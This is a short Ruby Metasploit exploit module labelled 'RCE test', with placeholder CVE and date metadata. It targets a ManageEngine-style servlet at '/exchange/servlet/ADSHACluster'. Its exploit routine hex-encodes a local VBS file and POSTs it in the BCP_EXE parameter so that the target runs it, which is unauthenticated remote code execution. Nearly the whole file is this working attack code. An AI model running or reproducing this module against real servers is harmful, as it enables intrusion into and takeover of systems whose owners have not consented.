require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(
            update_info(
                info,
                'Name'           => 'RCE test',
                'Description'    => 'Metasploit RCE Module Test',
                'License'        =>  MSF_LICENSE,
                'Author'         =>
                    [
                        'al-fariqy raihan'
                    ],
                'References'     =>
                    [
                        ['CVE', '1970-0001']
                    ],
                'Platform'          => ['win'],
                'Targets'        =>
                    [
                        ['Universal', {}]
                    ],
                'DisclosureDate' => 'Jan 01 1970',
                'DefaultTarget'  => 0
            )
        )

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The path to manage engine root', '/'])
			], self.class)

	end

    def bin_to_hex(s)

        s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
    end

	def exploit

		filename = 'aowkwkwk.vbs'
        file = File.open(filename, 'rb')
        contents = file.read

        endpoint = target_uri.path

        response = send_request_cgi(
            {
                'method'    => 'POST',
                'uri'       => normalize_uri(endpoint, '/exchange/servlet/ADSHACluster'),
                'vars_post' => {
                    'MTCALL'   =>  'nativeClient',
                    'BCP_RLL'  =>  '0102',
                    'BCP_EXE'  =>  bin_to_hex(contents)
                }
            }
        )

        if response && (response.code == 200)
            print_good('Success')
        else
            print_error('Failed')
        end
	end

end